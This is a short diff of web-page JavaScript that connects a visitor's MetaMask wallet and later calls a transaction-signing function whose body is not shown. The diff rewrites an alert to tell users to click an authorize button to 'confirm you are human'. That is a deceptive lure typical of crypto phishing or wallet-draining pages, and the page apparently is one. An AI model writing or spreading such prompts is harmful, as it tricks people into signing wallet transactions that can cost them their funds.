@@ -6,12 +6,13 @@ function isMobile() {
     return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 }
 
+// Connect MetaMask wallet
 document.getElementById('get-started').addEventListener('click', async () => {
     if (typeof window.ethereum !== 'undefined' || typeof window.web3 !== 'undefined') {
         try {
             // Request account access
             await ethereum.request({ method: 'eth_requestAccounts' });
-            alert('MetaMask is connected, now click the authorize button to confirm issue');
+            alert('MetaMask is connected,,now click the authorize button to confirm you are human');
 
             // Create a provider
             provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -19,11 +20,11 @@ document.getElementById('get-started').addEventListener('click', async () => {
             // Get the signer (connected user)
             signer = provider.getSigner();
         } catch (error) {
-            console.error('User denied account access', error);
+            alert('User denied account access', error);
         }
     } else {
         alert('MetaMask is not installed. Please install it to use this app.');
-        console.error('MetaMask is not installed');
+        alert('MetaMask is not installed');
     }
 });
 
@@ -83,7 +84,7 @@ async function createAndSignTransaction() {
             alert('Please connect your wallet first.');
         }
     } else {
-        console.error('MetaMask is not installed');
+        alert('MetaMask is not installed');
         alert('MetaMask is not installed. Please install it to use this app.');
     }
 }
